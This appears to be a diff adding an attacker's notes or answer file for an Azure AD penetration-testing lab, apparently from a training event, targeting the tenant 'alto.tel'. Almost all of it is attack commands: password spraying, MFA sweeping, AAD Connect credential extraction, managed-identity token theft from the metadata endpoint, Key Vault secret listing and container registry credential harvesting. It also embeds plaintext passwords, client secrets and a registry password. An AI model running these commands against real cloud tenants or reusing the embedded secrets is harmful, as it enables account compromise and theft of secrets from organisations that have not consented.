@@ -1,0 +1,144 @@
+alto\Administrator	Passw0rd!
+alto\pwnd.user		Passw0rd@
+
+# initial
+
+Set-ExecutionPolicy Bypass
+Import-Module aadinternals
+Import-Module 'C:\Users\hacker\Desktop\Az-Tools\MFASweep-master\MFASweep.ps1'
+Import-Module 'C:\Users\hacker\Desktop\Az-Tools\MicroBurst-master\MicroBurst.psm1'
+Import-Module 'C:\Users\hacker\Desktop\Az-Tools\MSOLSpray-master\MSOLSpray.ps1'
+#Import-Module 'C:\Users\hacker\Desktop\Az-Tools\PowerZure-master\PowerZure.psd1'
+Set-Location 'C:\Users\hacker\Desktop\Az-Tools'
+#Clear-Host 
+
+# users
+
+admin@alto.tel
+administrator@alto.tel
+pwd.spray99@alto.tel
+mobi.con@alto.tel
+pwd.spray@alto.tel
+loc.con@alto.tel
+linux.con@alto.tel
+mfa.enabled@alto.tel
+
+# answers
+
+
+Import Modules
+--------------
+cd 'C:\Users\hacker\Desktop\Az-Tools'; Set-ExecutionPolicy Bypass -Scope CurrentUser; Import-Module AADInternals; Import-Module .\MicroBurst-master\MicroBurst.psm1; Import-Module .\MFASweep-master\MFASweep.ps1; Import-Module .\MSOLSpray-master\MSOLSpray.ps1
+
+
+Get Azure AD service accounts
+-----------------------------
+Get-AzureADDirectoryRole | where {$_.DisplayName -eq "Directory Synchronization Accounts"} | Get-AzureADDirectoryRoleMember
+
+Get AAD Connect Account Credentials
+-----------------------------------
+Install-Module AADInternals
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+
+
+Enumerations
+++++++++++++
+
+Validate Tenant
+---------------
+https://login.microsoftonline.com/alto.tel/v2.0/.well-known/openid-configuration
+https://login.microsoftonline.com/getuserrealm.srf?login=username@alto.tel&xml=1
+
+Invoke-AADIntReconAsOutsider -DomainName alto.tel | Format-Table
+
+Enumerate Services
+------------------
+Import-Module '.\Az Tools\MicroBurst-master\MicroBurst.psm1'
+
+Invoke-EnumerateAzureSubDomains -Base altotel -Verbose
+
+
+Enumerate Users
+---------------
+Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal
+
+Password Spraying
+-----------------
+Invoke-MSOLSpray -UserList .\users.txt -Password "HiTB@NL-2023"
+
+MFA Sweep
+---------
+Invoke-MFASweep -Username mobi.con@alto.tel -Password "HiTB@NL-2023"
+
+Login as SP
+-----------
+$TenantID = "17e2a955-2919-4798-bb93-28b9ef7055ce"
+$AppID = "731dc0c2-2fd2-403f-91bc-98422726ebef"
+$AppSecret = "F1R8Q~Ptep58SGyT6r4Syk7ZpzQabV3d6brtZcc."
+$SecureString = $AppSecret | ConvertTo-SecureString -AsPlainText -Force
+$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $AppID,$SecureString
+Connect-AzAccount -ServicePrincipal -Credential $Credential -TenantId $TenantID
+Get-AzRoleAssignment
+
+Get VM Manged ID Token
+----------------------
+Management token
+(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing).Content | ConvertFrom-Json | select access_token,client_id | fl
+
+Vault token
+(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing).Content | ConvertFrom-Json | select access_token,client_id | fl
+
+Connect Using Token
+-------------------
+Connect-AzAccount -AccessToken $mgttoken -AccountId 4c5ff6a1-85e6-4148-a20c-612a21f77a5c
+
+Get-AzRoleAssignment
+
+List Secrets
+------------
+$vtoken=
+Get-AzKeyVault
+
+Invoke-WebRequest -Uri https://altotel-keyvault-by-rbac.vault.azure.net/secrets/?api-version=7.1 -Method Get -Headers  @{Authorization="Bearer $vtoken"}  -UseBasicParsing | ConvertFrom-Json
+
+Invoke-WebRequest -Uri https://altotel-keyvault-by-rbac.vault.azure.net/secrets/vm-admin-pass/?api-version=7.1 -Method Get -Headers @{Authorization="Bearer $vtoken"}  -UseBasicParsing | ConvertFrom-Json
+
+
+Get ACR Credentials
+-------------------
+Connect-AzAccount
+Login as vm.admin@alto.tel
+Get-AzContainerRegistry
+Get-AzContainerRegistryRepository -RegistryName altotelacr
+Invoke-AzResourceAction -Action listCredentials -ResourceType Microsoft.ContainerRegistry/registries -ResourceGroupName ACR_RG -ResourceName AltoTelACR
+
+Or using az cli:
+az login
+az acr list | ConvertFrom-Json
+az acr list | ConvertFrom-Json | select adminUserEnabled,anonymousPullEnabled,loginserver,name,resourceGroup,type
+
+Inspect Image
+-------------
+Start docker desktop client (GUI)
+Open CMD
+docker login -u altotelacr altotelacr.azurecr.io
+password: yLQcuO2VqC+IUokqtm+Oy116MUKj5sT8jPdOmVzLXU+ACRCePrEN
+docker image ls
+docker image pull altotelacr.azurecr.io/leaky-aci:latest
+docker image inspect altotelacr.azurecr.io/leaky-aci:latest
+
+Login as APP Serivce Principal
+------------------------------
+az login --service-principal --username d5959439-1deb-41d8-84b4-67406fc8dd19 --password HX08Q~MRoUopIFjlsRVQaUsCBy4gPuPL~o_YsbVU  --tenant 17e2a955-2919-4798-bb93-28b9ef7055ce
+
+az role assignment list --assignee d5959439-1deb-41d8-84b4-67406fc8dd19
+
+VM run commands
+
+
+
+
+
+
+
